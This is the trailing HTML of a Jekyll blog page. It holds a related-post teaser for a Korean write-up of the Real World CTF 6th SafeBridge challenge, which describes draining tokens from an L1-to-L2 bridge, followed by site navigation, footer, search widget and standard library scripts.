-->




<time
  
  data-ts="1706454000"
  data-df="ll"
  
>
  Jan 29, 2024
</time>

              <h4 class="pt-0 my-2">Real World CTF 6th (SafeBridge)</h4>
              <div class="text-muted">
                <p>
                  





                  개요

Real World CTF에 웹3 문제 있길래 풀어봤다. SafeBridge 문제의 솔브 조건은 L1 -&amp;gt; L2 브리지에서 토큰 잔액을 빼내는 것이었다. 이더리움에서 L1 -&amp;gt; L2 브리지는 주로 두 가지 계층 간의 상호 작용을 용이하게 하는 기술을 가리킨다.

contract Challenge {
    address public ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/ERC1337-DH/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Dreamhack CTF (ERC1337)</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

